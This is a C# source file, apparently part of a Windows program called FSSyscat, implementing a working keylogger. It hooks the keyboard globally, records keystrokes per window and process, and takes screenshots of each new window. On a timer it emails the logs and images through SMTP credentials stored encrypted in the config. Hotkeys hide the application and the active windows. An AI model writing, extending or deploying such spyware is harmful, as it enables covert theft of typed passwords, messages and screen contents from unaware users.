using FSDirectShow;
using FSLibrary;
using FSMouseKeyboardLibrary;
using FSSyscat.Classes;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace FSSyscat
{
    class Hook
    {
        public Hook()
        {
        }

        private ArrayList m_appNames;
        public static FSMouseKeyboardLibrary.Hook HookerKeyboard;
        //public static FSMouseKeyboardLibrary.MouseHook HookerMouse;

        private bool m_isAltDown;
        private bool m_isControlDown;
        private bool m_isF10Down;
        private bool m_isF11Down;
        private bool m_isF12Down;
        private bool m_isShiftDown;
        private static MailParameters m_emailparams;
        private bool m_isEmailerOn;
        private bool m_isLoggerOn;

        public static ArrayList LogData;

        private string m_logfilepath = "";

        private bool m_sendEmail;
        private int m_sendEmailMin;
        private string m_emailAddress;
        private string m_emailPassword;
        private string m_smtpServer;
        private int m_smtpPort;
        private bool m_useSsl;

        private bool m_saveLog;
        private int m_saveLogMin;

        private System.Windows.Forms.Timer m_timer_emailer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer m_timer_logsaver = new System.Windows.Forms.Timer();

        private KeyboardScanCode keybScan;
        private FSDirectShow.DirectSound directSound = new FSDirectShow.DirectSound();

        public void Start(bool hookKeys)
        {
            ReadConfig();

            m_appNames = new ArrayList();
            LogData = new ArrayList();
            
            if (hookKeys)
            {
                SetParams();
                Mail.DeleteCaptures();

                InitHook();
                StartApp();
            }

            keybScan = new KeyboardScanCode();
            directSound.Initialize(Program.frmMain.Handle);
        }

        private void ReadConfig()
        {
            m_sendEmail = Convert.ToBoolean(ConfigurationManager.AppSettings["SendEmail"]);
            m_sendEmailMin = Convert.ToInt32(ConfigurationManager.AppSettings["SendEmailMin"]);
            m_emailAddress = Crypt.Decrypt(ConfigurationManager.AppSettings["EmailCrypt"]);
            m_emailPassword = Crypt.Decrypt(ConfigurationManager.AppSettings["PasswordCrypt"]);
            m_smtpServer = ConfigurationManager.AppSettings["EmailServer"];
            m_smtpPort = Convert.ToInt32(ConfigurationManager.AppSettings["EmailPort"]);
            m_useSsl = Convert.ToBoolean(ConfigurationManager.AppSettings["EmailSSL"]);

            m_saveLog = Convert.ToBoolean(ConfigurationManager.AppSettings["SaveLog"]);
            m_saveLogMin = Convert.ToInt32(ConfigurationManager.AppSettings["SaveLogMin"]);
        }

        public void Close()
        {
            Program.frmMain.ForceClose = true;
            Program.frmMain.Close();
            
            Stop();
        }


        private void InitHook()
        {
            if (HookerKeyboard == null)
            {
                HookerKeyboard = new FSMouseKeyboardLibrary.Hook();
                HookerKeyboard.KeyDown += new KeyEventHandler(HookerKeyDown);
                HookerKeyboard.KeyPress += new KeyPressEventHandler(HookerKeyPress);
                HookerKeyboard.KeyUp += new KeyEventHandler(HookerKeyUp);
                //HookerKeyboard.MouseMove += new MouseEventHandler(MouseMoved);
            }

            //if(HookerMouse == null)
            //{
            //    HookerMouse = new FSMouseKeyboardLibrary.MouseHook();
            //    HookerMouse.MouseMove += new MouseEventHandler(MouseMoved);
            //}
        }

        private void StartApp()
        {
            if (!HookerKeyboard.IsStarted)
            {
                HookerKeyboard.Start();
                if (m_isEmailerOn)
                    m_timer_emailer.Enabled = true;
                if (m_isLoggerOn)
                    m_timer_logsaver.Enabled = true;
            }

            //if (!HookerMouse.IsStarted)
            //{
            //    HookerMouse.Start();
            //}
        }

        private void Stop()
        {
            if (HookerKeyboard.IsStarted)
            {
                HookerKeyboard.Stop();
                m_timer_emailer.Enabled = false;
                m_timer_logsaver.Enabled = false;
            }

            //if(HookerMouse.IsStarted)
            //{
            //    HookerMouse.Stop();
            //}
        }

        public void HookerKeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyData)
            {
                case Keys.RMenu:
                case Keys.LMenu:
                    m_isAltDown = true;
                    Logger("[Alt]");
                    break;
                case Keys.RControlKey:
                case Keys.LControlKey:
                    m_isControlDown = true;
                    Logger("[Ctr]");
                    break;
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    m_isShiftDown = true;
                    Logger("[Shift]");
                    break;
                case Keys.Escape:
                    Logger("[Esc]");
                    break;
                case Keys.Return:
                    Logger("[E]" + Environment.NewLine);
                    break;
                case Keys.F1:
                case Keys.F2:
                case Keys.F3:
                case Keys.F4:
                case Keys.F5:
                case Keys.F6:
                case Keys.F7:
                case Keys.F8:
                case Keys.F9:
                    Logger("[" + e.KeyData.ToString() + "]");
                    break;
                case Keys.F10:
                    m_isF10Down = true;
                    break;
                case Keys.F11:
                    m_isF11Down = true;
                    break;
                case Keys.F12:
                    m_isF12Down = true;
                    break;
            }

            //Mostarmo/ocultamos la aplicación
            if (m_isAltDown & m_isControlDown & m_isShiftDown & m_isF12Down)
            {
                Program.frmMain.ShowApp();
            }

            //Mostramos todas las ventanas ocultas
            if (m_isAltDown & m_isControlDown & m_isShiftDown & m_isF11Down)
            {
                ProcessUtil.ShowAllProcessWithTittle();
            }

            //Ocultamos la ventana activa
            if (m_isAltDown & m_isControlDown & m_isShiftDown & m_isF10Down)
            {
                ProcessUtil.HideActiveWindow();
            }


            if (Program.KeyboardSound)
            {
                //reproducimos el sonido de la tecla.
                //FSLibrary.Multimedia.PlayWav("key.wav");
                //FSLibrary.Wav.Play("key.wav");
                string soundFile = Application.StartupPath + "\\" + ConfigurationManager.AppSettings["SoundPath"];
                string keyScan = keybScan.VirtualKeyToScanCode(e.KeyValue).ToString();
                Dictionary<string, object> soundConfigValues = (Dictionary<string, object>)Program.soundConfig.FirstOrDefault(x => x.Key == "defines").Value;
                object value = soundConfigValues.FirstOrDefault(x => x.Key == keyScan).Value;
                if (value != null)
                {
                    directSound.Load((soundFile.EndsWith("\\") ? soundFile : soundFile + "\\") + value.ToString());
                    directSound.Stop();
                    directSound.Play();
                }
            }
        }

        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == 9)
                Logger("[Tab]");
            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
                Logger(e.KeyChar.ToString());
            else if (e.KeyChar == 32)
                Logger(" ");
            else if (e.KeyChar == 43)
                Logger("+");
            else if (e.KeyChar == 60)
                Logger("<");
            else if (e.KeyChar == 62)
                Logger(">");
            else if (e.KeyChar == 8)
                Logger("←");
            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
                Logger("[Char\\" + ((byte)e.KeyChar) + "]");
        }

        public void HookerKeyUp(object sender, KeyEventArgs e)
        {
            switch (e.KeyData)
            {
                case Keys.RMenu:
                case Keys.LMenu:
                    m_isAltDown = false;
                    break;
                case Keys.RControlKey:
                case Keys.LControlKey:
                    m_isControlDown = false;
                    break;
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    m_isShiftDown = false;
                    break;
                case Keys.F10:
                    m_isF10Down = false;
                    break;
                case Keys.F11:
                    m_isF11Down = false;
                    break;
                case Keys.F12:
                    m_isF12Down = false;
                    break;
            }
        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
            Program.frmMain.MouseLabel = String.Format("X:{0},Y={1},Wheel:{2},Button:{3},Clicks:{4}", e.X, e.Y, e.Delta, e.Button.ToString(), e.Clicks);
        }

        private void Logger(string txt)
        {
            if (txt == "")
                return;

            //txt_Log.AppendText(txt);
            //txt_Log.SelectionStart = txt_Log.Text.Length;

            try
            {
                Process p = Process.GetProcessById(Win32API.GetWindowProcessID(Win32API.GetForegroundWindow()));
                string _process = p.ProcessName;
                string _appltitle = Win32API.GetActiveWindowTitle();
                string _thisapplication = _appltitle + "@" + _process;

                if (!m_appNames.Contains(_thisapplication))
                {
                    m_appNames.Add(_thisapplication);
                    LogData.Add(new KeyData("", _process, _appltitle, System.DateTime.Now, "", "", null, false));

                    CaptureScr(LogData.Count - 1);
                }

                foreach (KeyData k in LogData)
                {
                    if (_thisapplication == k.app + "@" + k.process)
                    {
                        LogData.Remove(k);
                        LogData.Add(new KeyData(k.key + txt, k.process, k.app, System.DateTime.Now, k.image, k.imageGuid, k.img, k.sendByEmail));
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private void TimerEmailerTick(object sender, EventArgs e)
        {
            SendEmail();
        }

        public static void SendEmail()
        {
            string logstr = GenerateMailLog();

            if (logstr == "")
                return;

            MailParameters _params = new MailParameters(logstr, m_emailparams.Mailaddress,
                                     m_emailparams.Mailpassword, m_emailparams.SmtpHost,
                                     m_emailparams.SmtpPort, m_emailparams.EnableSsl);

            Thread mailer = new Thread(delegate() { Mail.SendMail(_params); });
            mailer.Start();
        }

        private void CaptureScr(int position)
        {
            Thread capt = new Thread(delegate() { CaptureScreen(position); });
            capt.Start();
        }

        private void TimerLogsaverTick(object sender, EventArgs e)
        {
            SaveLogfile(m_logfilepath);
        }

        private void SetParams()
        {
            if (m_sendEmail)
            {
                m_emailparams = new MailParameters(null, m_emailAddress, m_emailPassword,
                                         m_smtpServer, m_smtpPort,
                                         m_useSsl);

                m_timer_emailer.Tick += new System.EventHandler(this.TimerEmailerTick);
                m_timer_emailer.Interval = (int)(m_sendEmailMin * 60000);
                m_timer_emailer.Enabled = true;
                m_isEmailerOn = true;
            }
            else
            {
                m_timer_emailer.Enabled = false;
                m_isEmailerOn = false;
            }

            if (m_saveLog)
            {
                m_timer_logsaver.Tick += new System.EventHandler(this.TimerLogsaverTick);
                m_timer_logsaver.Interval = (int)(m_saveLogMin * 60000);
                m_timer_logsaver.Enabled = true;
                m_isLoggerOn = true;
            }
            else
            {
                m_timer_logsaver.Enabled = false;
                m_isLoggerOn = false;
            }
        }

        private void SaveLogfile(string pathtosave)
        {
            try
            {
                string xlspath = m_logfilepath.Substring(0, m_logfilepath.LastIndexOf("\\") + 1) + "ApplogXSL.xsl";
                if (!File.Exists(xlspath))
                {
                    File.Create(xlspath).Close();
                    string xslcontents =
                        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                    var xslwriter = new StreamWriter(xlspath);
                    xslwriter.Write(xslcontents);
                    xslwriter.Flush();
                    xslwriter.Close();
                }
                var writer = new StreamWriter(pathtosave, false);

                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine("");
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine("");
                writer.Write("<ApplDetails>");

                foreach (KeyData k in LogData)
                {
                    writer.Write("<Apps_Log>");
                    writer.Write("<ProcessName>");
                    string processname = "<![CDATA[" + k.process + "]]>";
                    processname = processname.Replace("\0", "");
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    string applname = "<![CDATA[" + k.app + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");

                    writer.Write("<CapImage>");
                    string capImage = "<![CDATA[" + k.image + "]]>";
                    writer.Write(capImage);
                    writer.Write("</CapImage>");

                    writer.Write("<LogData>");
                    string ldata = ("<![CDATA[" + k.key + "]]>").Replace("\0", "");
                    writer.Write(ldata);

                    writer.Write("</LogData>");
                    writer.Write("</Apps_Log>");
                }
                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private static string GenerateMailLog()
        {
            try
            {
                string Logdata = "";

                foreach (KeyData k in LogData)
                {
                    if (k.sendByEmail == false)
                    {
                        Logdata += "<p>[" + k.time.ToString() + "] - " + k.process + " - ";
                        Logdata += k.app + "<br />";
                        Logdata += "Datos: <br />";
                        Logdata += k.key + "</p><br /><br />";
                        Logdata += String.Format(@"<img width=""50%"" height=""50%"" src=""cid:{0}"" />", k.imageGuid);

                        k.sendByEmail = true;
                    }
                }

                if (Logdata != "")
                    Logdata = "Datos de log<br />" + Logdata;

                return Logdata;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
            return null;
        }

        private void CaptureScreen(int position)
        {
            ScreenCapture sc = new ScreenCapture();
            IntPtr handle = Win32API.GetForegroundWindow();

            //Image img = sc.CaptureScreen();
            //Image img = sc.CaptureWindow(handle);

            //this.picScreen.Image = img;

            string tempPath = System.IO.Path.GetTempPath();
            string image = tempPath + "cpt_" + position.ToString() + ".jpg";
            //Image img = sc.CaptureWindowToFile(handle, image, ImageFormat.Jpeg);
            Image img = sc.CaptureScreenToFile(image, ImageFormat.Jpeg);

            KeyData k = (KeyData)LogData[position];
            k.image = image;
            k.imageGuid = Guid.NewGuid().ToString();
            k.img = img;
        }
    }
}
